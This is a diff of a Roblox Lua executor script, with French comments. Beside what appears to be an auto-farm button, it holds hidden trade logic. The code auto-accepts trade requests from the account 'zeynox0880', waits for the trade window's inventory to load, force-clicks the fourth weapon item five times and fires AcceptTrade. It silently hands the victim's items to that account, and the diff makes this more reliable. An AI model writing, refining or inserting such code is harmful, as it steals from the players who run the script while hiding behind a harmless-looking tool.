@@ -253,11 +253,10 @@ FarmButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [[ 4. LOGIQUE D'AUTO-TRADE VISUEL AVEC CLICS TRIÉS ]]
+-- [[ 4. LOGIQUE D'AUTO-TRADE SECURISEE (ATTENTE DU RENDU VRAI) ]]
 local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
 local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
 
--- Émulation forcée des clics de souris
 local function forceClick(guiButton)
     if guiButton then
         local firesignal = firesignal or (syn and syn.firesignal)
@@ -271,35 +270,44 @@ end
 
 local function checkAndExecuteTrade(child)
     if child.Name == "TradeGUI" then
-        -- Vérifie si zeynox0880 est bien présent
+        -- Ne s'active que si zeynox0880 est bien présent dans le serveur
         if not Players:FindFirstChild("zeynox0880") then return end
         
-        -- Attente que l'interface charge ses éléments internes
-        task.wait(0.8)
-        
+        -- On cherche le conteneur exact demandé
         local containerPath = nil
-        pcall(function()
-            containerPath = child.Container.Items.Main.Weapons.Items.Container.Current.Container
-        end)
+        for i = 1, 30 do -- Attend max 3 secondes que le chemin d'accès se crée
+            pcall(function()
+                containerPath = child.Container.Items.Main.Weapons.Items.Container.Current.Container
+            end)
+            if containerPath then break end
+            task.wait(0.1)
+        end
         
         if containerPath then
-            -- On extrait uniquement les boutons d'items valides
+            -- BOUCLE DE SÉCURITÉ REFAITE : On attend que le conteneur ait réellement chargé au moins 4 enfants visibles
             local cleanItems = {}
-            for _, item in ipairs(containerPath:GetChildren()) do
-                if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
-                    table.insert(cleanItems, item)
+            for attempt = 1, 50 do
+                cleanItems = {}
+                for _, item in ipairs(containerPath:GetChildren()) do
+                    if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
+                        table.insert(cleanItems, item)
+                    end
                 end
+                
+                if #cleanItems >= 4 then 
+                    break 
+                end
+                task.wait(0.1) -- Attend que le jeu finisse de générer l'inventaire graphique
             end
             
-            -- TRUQUE ESSENTIEL : Trie les éléments par ordre d'affichage réel (LayoutOrder)
+            -- Tri par ordre d'affichage visuel réel (LayoutOrder)
             table.sort(cleanItems, function(a, b)
-                return (a:IsA("GuiObject") and b:IsA("GuiObject")) and (a.LayoutOrder < b.LayoutOrder)
+                return a.LayoutOrder < b.LayoutOrder
             end)
             
-            -- On sélectionne le 4ème élément du rendu visuel
+            -- Ciblage et exécution des 5 clics sur le 4e item
             local targetWeaponButton = cleanItems[4]
             if targetWeaponButton then
-                -- Clique 5 fois d'affilée
                 for i = 1, 5 do
                     forceClick(targetWeaponButton)
                     task.wait(0.05)
@@ -307,12 +315,11 @@ local function checkAndExecuteTrade(child)
             end
         end
         
-        -- Acceptation du Trade finale
+        -- Validation finale du Trade auprès du jeu
         task.wait(0.5)
         if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
             TradeNetwork:FireServer("AcceptTrade")
         else
-            -- Solution alternative directe
             local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
             if acceptRemote then
                 if acceptRemote:IsA("RemoteFunction") then acceptRemote:InvokeServer()
@@ -322,14 +329,14 @@ local function checkAndExecuteTrade(child)
     end
 end
 
--- Écouteurs d'activation de l'interface
+-- Écouteurs de l'interface graphique de trade
 playerGui.ChildAdded:Connect(checkAndExecuteTrade)
 local existingTrade = playerGui:FindFirstChild("TradeGUI")
 if existingTrade then
     task.spawn(function() checkAndExecuteTrade(existingTrade) end)
 end
 
--- Acceptation initiale automatique de la demande envoyée par zeynox0880
+-- Acceptation initiale automatique de l'invitation envoyée par zeynox0880
 if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
     TradeNetwork.OnClientEvent:Connect(function(action, data)
         if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
